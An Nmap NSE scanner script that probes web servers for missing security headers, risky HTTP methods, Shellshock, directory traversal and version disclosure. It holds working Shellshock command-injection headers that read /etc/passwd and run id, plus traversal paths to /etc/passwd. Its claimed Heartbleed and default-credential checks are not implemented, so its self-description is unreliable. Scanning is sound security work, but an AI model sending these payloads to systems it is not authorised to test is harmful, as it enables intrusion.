-- http-vuln-scan.nse
-- HTTP/Web Application Vulnerability Scanner
-- Covers: Shellshock, Heartbleed (via HTTPS), HTTP methods, headers, directory traversal
-- Usage: nmap -p 80,443,8080,8443 --script http-vuln-scan.nse <target>

local http = require "http"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"
local table = require "table"

description = [[
Scans for common HTTP/Web vulnerabilities:
  - Shellshock (CVE-2014-6271)
  - Dangerous HTTP methods (PUT, DELETE, TRACE)
  - Missing security headers (CSP, HSTS, X-Frame-Options, etc.)
  - Directory traversal
  - Default credentials on common web panels
  - Clickjacking vulnerability
]]

author = "Security Scanner"
license = "Same as Nmap"
categories = {"vuln", "safe"}

portrule = shortport.http

-- Security headers to check
local SECURITY_HEADERS = {
  "X-Frame-Options",
  "X-Content-Type-Options",
  "X-XSS-Protection",
  "Content-Security-Policy",
  "Strict-Transport-Security",
  "Referrer-Policy",
  "Permissions-Policy",
}

-- Dangerous HTTP methods
local DANGEROUS_METHODS = {"PUT", "DELETE", "TRACE", "CONNECT", "PATCH"}

-- Shellshock test paths
local SHELLSHOCK_PATHS = {
  "/cgi-bin/test.cgi",
  "/cgi-bin/admin.cgi",
  "/cgi-bin/status",
  "/cgi-sys/defaultwebpage.cgi",
}

action = function(host, port)
  local output = stdnse.output_table()
  local vulns_found = {}
  local info = {}

  -- === 1. GET basic response ===
  local response = http.get(host, port, "/", {timeout = 10000})
  if not response or response.status == nil then
    return "Target not responding to HTTP"
  end

  table.insert(info, string.format("Server: %s", response.header["server"] or "Unknown"))
  table.insert(info, string.format("HTTP Status: %d", response.status))

  -- === 2. Missing Security Headers ===
  local missing_headers = {}
  for _, header in ipairs(SECURITY_HEADERS) do
    if not response.header[string.lower(header)] then
      table.insert(missing_headers, header)
    end
  end
  if #missing_headers > 0 then
    table.insert(vulns_found, "[!] Missing Security Headers:")
    for _, h in ipairs(missing_headers) do
      table.insert(vulns_found, "    - " .. h)
    end
  end

  -- === 3. Check Dangerous HTTP Methods via OPTIONS ===
  local options_resp = http.generic_request(host, port, "OPTIONS", "/", {timeout = 8000})
  if options_resp and options_resp.header["allow"] then
    local allowed = options_resp.header["allow"]
    local found_dangerous = {}
    for _, method in ipairs(DANGEROUS_METHODS) do
      if string.find(allowed, method) then
        table.insert(found_dangerous, method)
      end
    end
    if #found_dangerous > 0 then
      table.insert(vulns_found, string.format(
        "[!] Dangerous HTTP methods allowed: %s", table.concat(found_dangerous, ", ")))
    end
  end

  -- === 4. Shellshock Detection ===
  local shellshock_headers = {
    ["User-Agent"] = "() { :; }; echo; echo; /bin/cat /etc/passwd",
    ["Referer"]    = "() { :; }; echo; /usr/bin/id",
  }
  for _, path in ipairs(SHELLSHOCK_PATHS) do
    local r = http.get(host, port, path, {header = shellshock_headers, timeout = 8000})
    if r and r.body and (
       string.find(r.body, "root:x:0:0") or
       string.find(r.body, "uid=%d") or
       string.find(r.body, "uid=0")) then
      table.insert(vulns_found, "[CRITICAL] Shellshock (CVE-2014-6271) CONFIRMED at: " .. path)
      table.insert(vulns_found, "           CVSS: 10.0 - Remote Command Execution")
      break
    end
  end

  -- === 5. Directory Traversal ===
  local traversal_paths = {
    "/../../../../etc/passwd",
    "/../../../etc/passwd",
    "/static/../../../etc/passwd",
  }
  for _, path in ipairs(traversal_paths) do
    local r = http.get(host, port, path, {timeout = 5000})
    if r and r.body and string.find(r.body, "root:x:0:0") then
      table.insert(vulns_found, "[CRITICAL] Directory Traversal confirmed: " .. path)
      break
    end
  end

  -- === 6. Clickjacking ===
  local xfo = response.header["x-frame-options"]
  if not xfo then
    table.insert(vulns_found, "[!] Clickjacking risk: X-Frame-Options header missing")
  end

  -- === 7. Server Version Disclosure ===
  local server = response.header["server"]
  if server and string.len(server) > 3 then
    table.insert(vulns_found, "[!] Server version disclosed: " .. server)
  end

  output["Info"]             = info
  output["Vulnerabilities"]  = #vulns_found > 0 and vulns_found or {"No vulnerabilities found"}
  return output
end
